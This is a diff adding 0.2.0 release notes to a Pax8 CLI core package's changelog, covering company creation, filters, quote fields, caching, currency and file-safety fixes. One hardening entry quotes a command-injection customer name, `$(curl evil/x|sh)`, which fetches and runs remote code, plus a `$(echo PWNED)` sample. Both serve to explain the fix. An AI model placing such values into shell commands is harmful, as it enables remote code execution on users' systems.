@@ -1,5 +1,149 @@
 # @pax8/core
 
+## 0.2.0
+
+### Minor Changes
+
+- [#381](https://github.com/pax8labs/pax8-cli/pull/381) [`830774a`](https://github.com/pax8labs/pax8-cli/commit/830774a8845058541f6cc01afc16dc147694cdbe) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies create` (and its `pax8 clients create` alias) now creates Active companies by default via the atomic contacts-array pattern (PAM-997 / PAM-1171 / ARC-774). The same `POST /companies` accepts an optional `contacts: [...]` array; including a properly-typed primary contact flips the new company from Inactive to Active at creation.
+
+  New required flags on the default (atomic) path: `--first-name`, `--last-name`, `--email`, `--phone`. The supplied contact is implicitly set as `primary: true` for all three ContactType values (Admin, Billing, Technical), matching the Pax8 API Reference's activation guidance: "one contact with all three types and marked as primary for each type is sufficient." `--phone` is shared between the company and the contact — partners who need different phones can use `--company-only` then `pax8 contacts create`.
+
+  Opt-out via `--company-only` produces an Inactive company. The command prints a verbatim warning to stderr explaining the consequences (won't appear in portal, won't support orders/subscriptions/quotes, blocks re-creation with "already exists" until primary contacts are added via `pax8 contacts create`).
+
+  `@pax8/core` schema: new `CreateCompanyContactInputSchema` for the inline contact payload; `CreateCompanyInputSchema` gains an optional `contacts` field. The inline shape mirrors `CreateContactInputSchema` but omits `companyId` (the company doesn't exist yet).
+
+  Closes [#330](https://github.com/pax8labs/pax8-cli/issues/330). Addresses pre-publish review feedback that the v0.1.0 CLI was creating Inactive companies that partners couldn't use until they discovered the contact requirement.
+
+- [#405](https://github.com/pax8labs/pax8-cli/pull/405) [`d20b113`](https://github.com/pax8labs/pax8-cli/commit/d20b1137ec74e81c9745f5f8f76484086a2f44e8) Thanks [@jidulberger](https://github.com/jidulberger)! - Expose every server-side list filter the OpenAPI spec already supports on the `quotes`, `clients`/`companies`, and `invoices` list endpoints. Three related fix-before-launch findings from the partner-readiness audit (`docs/triage/partner-readiness-audit/01-api-conformity-reads.md`) — the spec defined the filters, but the CLI either filtered client-side (quotes) or omitted the parameters entirely (companies, invoices), forcing partners with large portfolios to download full lists before filtering locally.
+  - `pax8 quotes list --status` is now server-side and accepts the full 9-value v2 enum (`draft | assigned | sent | closed | declined | accepted | changes_requested | expired | pending`). Closes [#387](https://github.com/pax8labs/pax8-cli/issues/387).
+  - `pax8 clients list` (and `pax8 companies list`) now expose `--city` / `--state` / `--country` / `--zip`, `--self-service` / `--bill-on-behalf` / `--order-approval`, and `--sort <name|city|country|state|zip>`. The CLI vocabulary maps `--state` → `stateOrProvince` and `--zip` → `postalCode` per the existing convention documented for `companies create` ([#327](https://github.com/pax8labs/pax8-cli/issues/327)/[#328](https://github.com/pax8labs/pax8-cli/issues/328)). The generic `filter` parameter on `CompaniesApi.list` (no OpenAPI backing) is dropped — no deprecation since the package is pre-v0.1.0. Closes [#388](https://github.com/pax8labs/pax8-cli/issues/388).
+  - `pax8 invoices list` now exposes `--from` / `--to` (mapping to `invoiceDateRangeStart` / `invoiceDateRangeEnd`) and `--sort` with the full spec enum (`invoice-date | due-date | status | partner-name | total | balance | carried-balance`). The kebab-cased flag values map onto the wire's camelCase. Closes [#389](https://github.com/pax8labs/pax8-cli/issues/389).
+
+  All three are additive — existing invocations without the new flags continue to work unchanged. `MockPax8Client` mirrors the server-side filtering for every new parameter so `PAX8_DEMO=1` exercises the same code path as the real API.
+
+- [#430](https://github.com/pax8labs/pax8-cli/pull/430) [`5617161`](https://github.com/pax8labs/pax8-cli/commit/561716145e254eaf91d75c00c8b6e371c8856c22) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes line-items add` and `pax8 quotes create` (shorthand path) now accept `--commitment-term <enum>` and `--commitment-term-id <uuid>`, mirroring the orders create pattern (`packages/cli/src/commands/orders/create.ts:350-351`). When `--commitment-term` is supplied, the CLI auto-resolves it to a commitment-term UUID against the partner's existing subscriptions for the product — same `resolveCommitmentTermId()` helper orders create uses. When `--commitment-term-id` is supplied directly, it wins over any `--commitment-term` (UUID short-circuits the lookup, matching orders create precedence). The resolved `commitmentTermId` rides through to `POST /v2/quotes/{quoteId}/line-items` as `AddStandardLineItemPayload.commitmentTermId` (spec-confirmed in `quoting-endpoints.json`).
+
+  Required for Microsoft NCE and other commitment-priced SKUs per QUOTE-311 (the `AddLineItemToQuoteCommandPayload.commitmentTermId` field), QUOTE-1283 (commitment persisted on the line item itself), QUOTE-406 (backfill of older NULL rows), and the NCE proration spike (Model A canonical — commitment is decided at quote-time and inherited by the resulting order).
+
+  `@pax8/core`: `AddQuoteLineItemInputSchema` gains `commitmentTermId: z.string().optional()` (mirrors `OrderLineItemInputSchema`'s shape — not strict `.uuid()` because demo fixtures use Pax8-style synthetic IDs). `QuoteLineItemSchema` gains `commitmentTerm: CommitmentSchema.nullable().optional()` for the read surface (`{ id, term }` per the v2 spec's `LineItemResponse.commitmentTerm`). The existing `CommitmentSchema` is reused rather than defining a new shape — its extra-optional `endDate` is harmless on the quote-line wire and reuse means future drift propagates to both consumers.
+
+  `pax8 quotes show` and `pax8 quotes line-items list` now render a "Commit" column on the line-item table (the term label, e.g. "1-Year"); `--json` consumers see the full `commitmentTerm: { id, term }` object. Mirrors how subscriptions render `commitment.term`.
+
+  Demo fixture: the Redwood E5 line on `quote-redwood-001` now carries `commitmentTerm: { id, term: "1-Year" }` so the render path exercises end-to-end under `PAX8_DEMO=1`.
+
+  The parity test from [#426](https://github.com/pax8labs/pax8-cli/issues/426) (`packages/cli/src/__tests__/quotes-create-line-items-parity.test.ts`) was already structural — both new flags pass automatically. Belt-and-braces pin updated to enumerate them.
+
+  Follow-up to [#429](https://github.com/pax8labs/pax8-cli/issues/429) (Candidate E in `docs/triage/v0.1.0-candidates.md`).
+
+- [#427](https://github.com/pax8labs/pax8-cli/pull/427) [`d71a0f2`](https://github.com/pax8labs/pax8-cli/commit/d71a0f2e600332167587a2fffbf4198a32fa9e8b) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes show` now surfaces server-side totals from the v2 quoting API's `QuoteResponse.totals` object. Splits one-time charges (`Total (initial)`) from per-period subscription charges (`Total (recurring)`) — each shown with currency code. Zero-bucket lines are suppressed so a recurring-only quote shows only the recurring line and an initial-only quote shows only the initial line. When the API omits totals (defensive against API drift; the spec marks the field required), render falls back to the locally-summed sum of line-item subtotals — preserves the pre-change behavior for older API responses.
+
+  `@pax8/core` exports two new schemas / inferred types: `AmountCurrencySchema` / `AmountCurrency` and `InvoiceTotalsSchema` / `InvoiceTotals`. `QuoteSchema` and `QuoteLineItemSchema` both gain optional `totals: InvoiceTotalsSchema` fields. Optional (not required) so a partial / drifted API response doesn't fail the whole quote parse — render layer handles the absent case explicitly. JSON output passes the `totals` shape through unchanged from the wire (no transformation), so agents can read `totals.initialCost`, `totals.initialProfit`, `totals.initialTotal`, `totals.recurringCost`, `totals.recurringProfit`, `totals.recurringTotal` directly.
+
+- [#376](https://github.com/pax8labs/pax8-cli/pull/376) [`d88ce13`](https://github.com/pax8labs/pax8-cli/commit/d88ce13c6a0b2166f70c3d87b2320376286d0c06) Thanks [@jidulberger](https://github.com/jidulberger)! - **Recommendations (additive):** `pax8 recommendations` output now carries an `opportunityType` field alongside the existing `type`, using Pax8's canonical Opportunity Explorer 5-type taxonomy (`Upsell`, `Cross-sell`, `Add-on`, `Upgrade`, `Net-new`). Existing `type` field unchanged.
+
+  Mapping:
+
+  | Existing `type`              | Emitted `opportunityType` |
+  | ---------------------------- | ------------------------- |
+  | `cross_sell` (active subs)   | `Cross-sell`              |
+  | `cross_sell` (zero-sub cust) | `Net-new`                 |
+  | `seat_gap`                   | `Upsell`                  |
+
+  Zero-subscription companies now classify as `Net-new` instead of being silently routed through the `Cross-sell` rail — the closest existing surrogate for OE's `Net-new` motion, and the fix for surprise [#7](https://github.com/pax8labs/pax8-cli/issues/7) in `docs/triage/recommendations-conformance.md`.
+
+  Added `pax8 recommendations upsell --from-product <name> --to-product <name>` following the MCP "Proactive Upsell Opportunity Finder" composition pattern (Guide §3b): list every company on the source product who does not yet have the upsell target, with seats, current MRR, and contact details (`--with-contacts`). New exports from `@pax8/core`: `findUpsellCohort`, types `UpsellMatch`, `UpsellCohortReport`, `OpportunityType`.
+
+  Full taxonomy alignment — retiring the CLI's security-centric 7-category product taxonomy in favor of Pax8's canonical STAX/PCM categories, and migrating `seat_gap` with an alias period — is deferred to v0.2 ([#375](https://github.com/pax8labs/pax8-cli/issues/375)), to align with whatever taxonomy OE's `GET /opportunities` API publishes when ARC-785 ships.
+
+  Extends the disclosure-over-rewrite pattern from [#298](https://github.com/pax8labs/pax8-cli/issues/298) (vocabulary alignment) and [#299](https://github.com/pax8labs/pax8-cli/issues/299) (`mrrAtRisk` → `mrrRenewing` one-cycle alias). Cites Rovo research on PICS (4 executive categories) / STAX (8 L1 operational categories) / Taxonomy v2 (in flight, hierarchical L1/L2/L3) in the new STAX-divergence doc comment at the top of `packages/core/src/services/recommendations.ts` and in the v0.2 issue ([#375](https://github.com/pax8labs/pax8-cli/issues/375)).
+
+- [#498](https://github.com/pax8labs/pax8-cli/pull/498) [`32cb6c8`](https://github.com/pax8labs/pax8-cli/commit/32cb6c82f920358660a027d52151a5a0656f9339) Thanks [@jidulberger](https://github.com/jidulberger)! - Two hardening fixes against adversarial input from the partner-tenant API surface:
+  1. **`Recommendation.orderArgs` (new, `@pax8/core` minor bump).** `Recommendation.orderCommand` was a display string built by interpolating the upstream-controlled `companyName` into a shell template. A malicious customer name like `Acme" $(curl evil/x|sh) "` produced a working shell payload once a user or tool-using agent pasted it into `bash -c` or `eval`. New `orderArgs: string[] | null` field is the same content pre-tokenized as an argv-style array (first element is `"pax8"`); programmatic callers — REPL, `recommendations act`, the Claude skill — execute via this instead of evaluating the display string. `orderCommand` remains for display-only use and now prefers `companyId` when it's a UUID.
+  2. **Bug-report redactor catches upstream-resolved names.** When an error like `Company not found: "Acme Corp"` was sent to `pax8 report-bug`, `"Acme Corp"` was not in argv, so the existing argv-derived redaction missed it and the partner name shipped to the public GitHub issue body. `redactEnvelope` now harvests quoted substrings from `message` / `causes[]` / `recoverySteps[]` and treats them as additional `argTokens`. The regex spans from the first quote to the last quote on a line, so a hostile partner name with inner quotes (`Acme" $(echo PWNED) "`) gets scrubbed atomically.
+
+  Closes [#473](https://github.com/pax8labs/pax8-cli/issues/473). Addresses [#462](https://github.com/pax8labs/pax8-cli/issues/462).
+
+- [#407](https://github.com/pax8labs/pax8-cli/pull/407) [`8590150`](https://github.com/pax8labs/pax8-cli/commit/8590150a98e9779e1b17d9fc4dd0f0c9b587b1f2) Thanks [@jidulberger](https://github.com/jidulberger)! - Standardize timestamp field naming across `--json` output to canonical camelCase / past-tense / ISO 8601 (`createdAt`, `updatedAt`, `expiresAt`). Implements [#385](https://github.com/pax8labs/pax8-cli/issues/385) (B2 — block-launch refactor surfaced by the partner-readiness audit dim 02). Also closes [#390](https://github.com/pax8labs/pax8-cli/issues/390) (F5 — `Company.created` naming).
+
+  **Migration matrix:**
+
+  | Type         | Old field(s)                                  | New field(s)             |
+  | ------------ | --------------------------------------------- | ------------------------ |
+  | Company      | `created`, `updatedDate`                      | `createdAt`, `updatedAt` |
+  | Order        | `createdDate`                                 | `createdAt`              |
+  | Subscription | `createdDate`                                 | `createdAt`              |
+  | Quote        | `createdOn`, `expiresOn`                      | `createdAt`, `expiresAt` |
+  | Webhook      | `createdDate` (`updatedAt` already canonical) | `createdAt`              |
+
+  **Deprecation policy:** During this minor-version cycle the `--json` output emits BOTH the old and new field names on every row, mirroring the `mrrAtRisk` → `mrrRenewing` precedent from [#299](https://github.com/pax8labs/pax8-cli/issues/299). Existing `--json` consumers that read the old names keep working unchanged. The old aliases are slated for removal in **v0.3.0** and carry `@deprecated` JSDoc on the schema. New code should reference the canonical names exclusively.
+
+  **Schema-layer mechanics:** Each affected `*Schema` in `packages/core/src/api/types.ts` now wraps its object validator in a `z.preprocess()` step that accepts EITHER shape on the wire and populates BOTH names on the parsed object. The change is purely additive — new optional schema fields, no breaking changes to required ones. Demo data (`packages/core/src/mock/demo-data.ts`) keeps emitting the legacy wire shape so the preprocess code path is exercised in demo mode the same way it runs against the real API. CLI commands (`packages/cli/src/commands/`) and table/CSV column definitions reference the canonical names; the legacy aliases survive only on the `--json` output surface.
+
+  Subprocess tests (`packages/cli/src/__tests__/{companies,subscriptions,orders,quotes,webhooks.show}.test.ts`) pin that both old and new field names are present on every row of `--json` output for all five resource types. Unit tests in `packages/core/src/api/types.test.ts` pin that parsing either wire shape (legacy or canonical) produces both names on the parsed object.
+
+### Patch Changes
+
+- [#497](https://github.com/pax8labs/pax8-cli/pull/497) [`3796bf9`](https://github.com/pax8labs/pax8-cli/commit/3796bf9f1028bef64bf6cc6fcb24042466644740) Thanks [@jidulberger](https://github.com/jidulberger)! - Three interlocking fixes to the response-cache layer:
+  1. **Tenant + base-URL scoping.** `Pax8Client.buildCacheKey` previously keyed only on path / params / api / version, so a credential rotation or `PAX8_API_BASE` flip silently served tenant-A's cached responses into a tenant-B session for up to 24h (default TTL). Cache keys now include a SHA-256-truncated hash of `(clientId, PAX8_API_BASE env, baseUrl, apiBaseOverrides)`. **Upgrading invalidates existing on-disk cache entries** because the key prefix changes — first run after upgrade will be slower as the cache refills.
+  2. **Detached cache warmer removed.** `buildContext` was spawning three detached `pax8 list` child processes on every command run (companies / subscriptions / products) as a "warm the cache" optimization. Net effect was every invocation fanning into four processes, unnecessary API calls on commands that didn't need the data, and noise in `--quiet` mode process listings. Removed.
+  3. **`cache.enabled` / `cache.ttl_hours` honored.** The schema accepted these fields but `buildContext` never read them, so `cache.enabled: false` in `~/.pax8/config.yaml` still got the constructor's hard-coded 1h default. Now plumbed through end-to-end.
+
+  Closes [#455](https://github.com/pax8labs/pax8-cli/issues/455), [#466](https://github.com/pax8labs/pax8-cli/issues/466). Addresses [#253](https://github.com/pax8labs/pax8-cli/issues/253).
+
+- [#413](https://github.com/pax8labs/pax8-cli/pull/413) [`2788c73`](https://github.com/pax8labs/pax8-cli/commit/2788c73c6fcd83aba6f1d9aa32fb25e2e374f963) Thanks [@jidulberger](https://github.com/jidulberger)! - Hotfix for typecheck regression introduced by [#407](https://github.com/pax8labs/pax8-cli/issues/407). The timestamp standardization added canonical `createdAt` / `updatedAt` / `expiresAt` fields to the Zod schemas but didn't update the hand-coded interfaces in `packages/core/src/mock/demo-data.ts`. CLI command code (post-[#407](https://github.com/pax8labs/pax8-cli/issues/407)) reads `.createdAt` directly; TypeScript's union-narrowing across `Order | DemoOrder` (etc.) required the field on both sides, so accessing it failed with `Property 'createdAt' does not exist`. Main was broken on `pnpm -r exec tsc --noEmit` since [#407](https://github.com/pax8labs/pax8-cli/issues/407) merged; `pnpm test` passed because vitest doesn't run that step.
+
+  Fix: add canonical timestamp fields to all five demo-data interfaces (Company, Subscription, Order, Quote, Webhook), duplicate the 39 fixture records to carry both names, and ensure the four `create()` methods in `MockPax8Client` populate the new fields. Also normalize `quotes.update({ expiresOn })` to set BOTH `expiresOn` AND `expiresAt` so the schema preprocess doesn't revert user updates to the stored alias value.
+
+  No public-API change. JSON output continues to emit both old and new names per [#385](https://github.com/pax8labs/pax8-cli/issues/385).
+
+- [#380](https://github.com/pax8labs/pax8-cli/pull/380) [`788c83a`](https://github.com/pax8labs/pax8-cli/commit/788c83a01906095882bc53110ee8df285eb9da20) Thanks [@jidulberger](https://github.com/jidulberger)! - `FileCache` now honors `PAX8_CONFIG_DIR` (via `getConfigDir()`) instead of hardcoding `~/.pax8/cache`. The hardcoded path meant any caller that used the documented `PAX8_CONFIG_DIR` escape hatch got an inconsistent cache root, and the integration test harness in particular was unable to isolate per-worker caches — a `[pax8] CACHE HIT` from a previous test served stale data on rerun.
+
+  Behavior change is purely additive: if you don't set `PAX8_CONFIG_DIR`, `getConfigDir()` still returns `~/.pax8`, so the cache stays at `~/.pax8/cache`. Callers passing an explicit `cacheDir` to the `FileCache` constructor are unaffected.
+
+  Also adds `e2e/integration/orders.integration.test.ts` (orders v1 smoke + the `--status` no-op pin per [#369](https://github.com/pax8labs/pax8-cli/issues/369)) and updates the harness to (a) force `PAX8_DEMO=false` so a developer's `demo: true` config can't false-green integration runs, and (b) point each worker at a throwaway `PAX8_CONFIG_DIR` so the cache fix actually isolates per-worker.
+
+- [#441](https://github.com/pax8labs/pax8-cli/pull/441) [`bcd6fec`](https://github.com/pax8labs/pax8-cli/commit/bcd6fecc81ff470124382bae3bddd82afb27cb32) Thanks [@jidulberger](https://github.com/jidulberger)! - Reconcile OSS license references for consistency before publish ([#434](https://github.com/pax8labs/pax8-cli/issues/434)).
+
+  Fixed the one drift case where the human-readable README used "Apache 2.0" (space) while every machine-readable surface — every `package.json`'s `license` field, every SPDX header in source — uses the canonical SPDX identifier `Apache-2.0` (hyphenated). The change is one character (space → hyphen) in `README.md`, but the rationale is partner clarity: a single canonical form across every surface a partner, contributor, or automated license scanner reads.
+
+  Adds `packages/cli/src/__tests__/license-consistency.test.ts` as a regression guard, mirroring the forbidden-fields walker pattern from [#315](https://github.com/pax8labs/pax8-cli/issues/315). Future PRs cannot reintroduce the non-canonical "Apache <digit>" form in any tracked file outside the verbatim `LICENSE` template and historical CHANGELOG entries.
+
+  Walked the full 12-surface audit from [#434](https://github.com/pax8labs/pax8-cli/issues/434) (NOTICE, GitHub About, `pax8 --version`, `pax8 doctor`, `packages/core/README.md`, `docs/`, telemetry payloads, `.changeset/*`, generated CHANGELOG, README header badges, CI workflows, dependency licenses). Findings are in the PR description.
+
+  Dependency-license review: no GPL/AGPL/SSPL or other Apache-2.0-incompatible licenses across the dependency tree. The single `Unknown` entry (`spawndamnit`, a transitive dev-only changesets dep) ships an MIT LICENSE file; `pnpm` just can't parse its `"SEE LICENSE IN LICENSE"` field. `MPL-2.0` and `Python-2.0` entries are dev-only and compatible.
+
+  The separate coordination item — LICENSE legal sign-off (owner Courtney Norton, tracked in `docs/triage/launch-coordination.md`) — is not replaced by this change. Both must clear before publish.
+
+- [#502](https://github.com/pax8labs/pax8-cli/pull/502) [`93a7405`](https://github.com/pax8labs/pax8-cli/commit/93a7405e34556d62ef89dcfe1c2b13c693d5de95) Thanks [@jidulberger](https://github.com/jidulberger)! - Two interlocking money-correctness fixes that both inflated and mislabeled partner-cost numbers across dashboard, recommendations, cost-sim, and reports.
+
+  **Breaking-feeling change for some users:** monthly-cost aggregates will drop for any partner whose portfolio includes `One-Time`, `Trial`, or `Activation` line items. The pre-fix code returned `price × quantity` (gross) for these terms, which inflated every "monthly Pax8 cost" and "potential uplift" figure that aggregates `subscriptionMrr()`. These terms are not recurring revenue and now correctly contribute **0** to monthly aggregates. The drop is the _correct_ number — but it is a visible delta day-over-day, so partners reviewing dashboards after upgrade should expect their headline number to reset.
+
+  Specifics:
+  1. **`subscriptionMrr()` per-term divisor table.** Replaced the previous switch with a `Record<BillingTerm | "1-Year", number>` divisor table. `Monthly`, `Annual` (and the defensive `"1-Year"` alias used by `commitment.term`), `2-Year`, `3-Year` divide normally; `One-Time`, `Trial`, `Activation` contribute 0. Unknown enum values now contribute 0 and emit a one-shot stderr warning per process per unknown value — a future Pax8 enum addition surfaces instead of silently miscounting.
+  2. **`formatCurrency()` honors `currencyCode`.** The previous implementation hard-coded `"$"`, so every EUR / GBP / CAD partner saw their subscriptions, dashboard, top customers, recommendations, and cost-sim output mislabeled as USD. The `subscriptions list` table had a workaround that appended `" EUR"` per row; that suffix is dropped here and the formatter is the single source of truth via `Intl.NumberFormat`. Falls back to a numeric + code-suffix render when ICU rejects a code. `cost sim` now threads the matched current subscription's currency through to output.
+
+  New demo fixtures (`demo-data.ts`) provide regression gates: Coastline's One-Time EUR onboarding fee (zero-MRR + non-USD), Bright Minds' Trial Defender seat (zero-MRR), Acme's GBP Entra ID P2 (non-USD rendering).
+
+  Closes [#465](https://github.com/pax8labs/pax8-cli/issues/465), [#472](https://github.com/pax8labs/pax8-cli/issues/472).
+
+- [#406](https://github.com/pax8labs/pax8-cli/pull/406) [`75591cb`](https://github.com/pax8labs/pax8-cli/commit/75591cb57b4b8cda6ada2cddde179c53890719e6) Thanks [@jidulberger](https://github.com/jidulberger)! - Align the `QuoteSchema` Zod parser with the v2 quoting API's nested `client` object so `pax8 quotes list` / `quotes show` return a usable `companyId` against the real API. Closes [#384](https://github.com/pax8labs/pax8-cli/issues/384) (block-launch finding from `docs/triage/partner-readiness-audit/01-api-conformity-reads.md`).
+
+  Pre-fix, `GET /v2/quotes` returned `{ client: { id, isShadowCompany, name } }` per `quoting-endpoints.json → components.schemas.QuoteResponse`, but `QuoteSchema` expected a flat `companyId: z.string()`. Zod's default behavior dropped the unknown `client` key, leaving `companyId` undefined on every parsed row when run against the real API. Demo mode masked this because the demo `Quote` fixture carried a flat `companyId` directly.
+
+  `QuoteSchema` now `preprocess`es the wire payload to flatten `client.id → companyId` and surfaces `client.name` / `client.isShadowCompany` as flat optional `clientName` / `clientIsShadow` aliases. Demo data (`packages/core/src/mock/demo-data.ts`) now emits the spec's nested `client: {...}` shape and the `MockPax8Client` routes quote reads through `QuoteSchema.parse` — so the demo path exercises the same flattening as the real wire and demo mode stops masking the bug. The legacy flat shape (used by the `QuotesApi` unit-test fixtures) still parses cleanly because the preprocess passes through unchanged when no nested `client` is present.
+
+- [#499](https://github.com/pax8labs/pax8-cli/pull/499) [`99ff0a2`](https://github.com/pax8labs/pax8-cli/commit/99ff0a2a78b63998ca05c8fded9b41b885bdb0d3) Thanks [@jidulberger](https://github.com/jidulberger)! - Four interlocking fixes to local-state files written by the CLI:
+  1. **`PAX8_CONFIG_DIR` routing.** `idempotency.ts`, `dispute.ts`, the REPL pending-actions reader/writer in `repl.ts`, the writers in `companies/list.ts` and `recommendations/list.ts`, and the `init` command's error recovery text all hardcoded `path.join(homedir(), ".pax8")` (or read it via a dynamic `await import("os")` to dodge top-level greps). They now go through `getConfigDir()`, which honors `PAX8_CONFIG_DIR` and stays in sync between readers and writers. The `init` recovery hint renders the resolved path and tells the user how to point at a different root.
+  2. **Safe-write `0o600` + `O_NOFOLLOW`.** `last-list.ts`, the REPL `pending-actions.json` writes, the tmp-file step in `dispute.ts` and `idempotency.ts`, and `mock-client.ts`'s `demo-orders.json` writes all wrote via `fs.writeFile` / `writeFileSync`. Under the default umask this left partner-tenant business data world-readable on shared hosts and would follow an attacker-placed symlink at the destination. They now go through `safeWriteFileSync`.
+  3. **Repo-wide policy gate (`local-state-writers.test.ts`).** A vitest regression test enforces both rules across `packages/cli/src/` — no direct `os.homedir()`, no raw `writeFileSync` / `fs.writeFile` outside an explicit allow-list. Future state-file additions can't slip past.
+  4. **Test hermeticity.** `loader-extended.test.ts` previously created `~/.pax8` on the contributor's real home while exercising the default-path code path; it now stubs `os.homedir()` to a tmpdir per test. New `vitest.real-home-guard-setup.ts` snapshots `~/.pax8` before tests run and asserts the post-suite filesystem is unchanged — any test that mutates the real home now fails CI explicitly. This guard caught a pre-existing bug in `MockPax8Client.OrdersResource` (writes to `~/.pax8/demo-orders.json` ignored `PAX8_CONFIG_DIR`), fixed in this PR.
+
+  **Behavioral note:** demo-mode `demo-orders.json` now lives at `${PAX8_CONFIG_DIR}/demo-orders.json` instead of `~/.pax8/demo-orders.json`. Existing users with persisted demo state under `~/.pax8` will appear to have a fresh demo on first run after upgrade.
+
+  Follow-up tracked in [#504](https://github.com/pax8labs/pax8-cli/issues/504): `credential-store.ts` has the same architectural defect; its unit tests mock `fs.*` so the home-guard doesn't see the leak, but the fix belongs alongside this batch.
+
+  Closes [#458](https://github.com/pax8labs/pax8-cli/issues/458), [#469](https://github.com/pax8labs/pax8-cli/issues/469), [#475](https://github.com/pax8labs/pax8-cli/issues/475), [#459](https://github.com/pax8labs/pax8-cli/issues/459).
+
 ## 0.3.0
 
 ### Minor Changes
